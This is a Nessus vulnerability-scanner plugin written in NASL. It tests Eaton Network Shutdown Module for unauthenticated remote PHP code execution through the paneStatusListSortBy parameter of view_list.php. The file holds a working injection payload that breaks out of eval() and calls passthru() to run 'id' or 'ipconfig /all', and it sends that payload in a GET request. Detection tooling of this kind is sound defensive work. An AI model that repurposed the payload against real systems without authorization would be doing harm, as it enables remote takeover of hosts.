#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(60082);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2017/02/08 22:04:49 $");

  script_bugtraq_id(54161);
  script_osvdb_id(83199);
  script_xref(name:"EDB-ID", value:"30059");
  script_xref(name:"Secunia", value:"49103");

  script_name(english:"Eaton Network Shutdown Module view_list.php paneStatusListSortBy Parameter eval() Call Remote PHP Code Execution");
  script_summary(english:"Tries to run a command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that can be abused to
execute arbitrary PHP code."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of the Eaton Network Shutdown Module hosted on the remote
web server does not sanitize user input to the 'paneStatusListSortBy'
parameter of the 'view_list.php' script before using it as part of a
command to be executed via PHP's 'eval()' function.

An unauthenticated, remote attacker can leverage this issue to execute
arbitrary code on the affected host with administrative privileges.

Note that successful exploitation of this issue requires that the
software is configured with at least one power device and that the
install is likely to be affected by two other issues, although Nessus
has not checked for them."
  );
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Network Shutdown Module (sort_values) Remote PHP Code Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2012/06/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/07/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:eaton:network_shutdown_module");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2017 Tenable Network Security, Inc.");

  script_dependencies("network_shutdown_module_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/eaton_nsm");
  script_require_ports("Services/www", 4679);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:4679, embedded:FALSE);


install = get_install_from_kb(appname:"eaton_nsm", port:port, exit_on_fail:TRUE);
dir = install['dir'];
install_url = build_url(qs:dir, port:port);


# Try to exploit the issue to run a command.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";


# Try to exploit the issue to run a command.
foreach cmd (cmds)
{
  exploit = strcat("0", SCRIPT_NAME, '"]) & passthru("', cmd, '");#');
  url = strcat(
    '/view_list.php?',
    'paneStatusListSortBy=', urlencode(str:exploit, unreserved:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*()-")
  );
  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

  if (
    'Device list' >< res[2] &&
    '</TABLE>' >< res[2] &&
    egrep(pattern:cmd_pats[cmd], string:res[2])
  )
  {
    if (report_verbosity > 0)
    {
      output = strstr(res[2], '</TABLE>');
      output = output - strstr(output, '<TABLE');
      output = strstr(output, '<br />') - '<br />';
      if ('<br />' >< output) output = strstr(output, '<br />') - '<br />';
      output = ereg_replace(pattern:'^(\r?\n)+', replace:'', string:output);
      output = chomp(output);

      header =
        "Nessus was able to execute the command '" + cmd + "' on the remote" + '\n' +
        "host using the following URL";
      trailer = '';

      if (report_verbosity > 1)
      {
        trailer =
          'This produced the following output :\n' +
          '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
          output + '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      }

      report = get_vuln_report(items:url, port:port, header:header, trailer:trailer);
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, 'Eaton Network Shutdown Module', install_url);
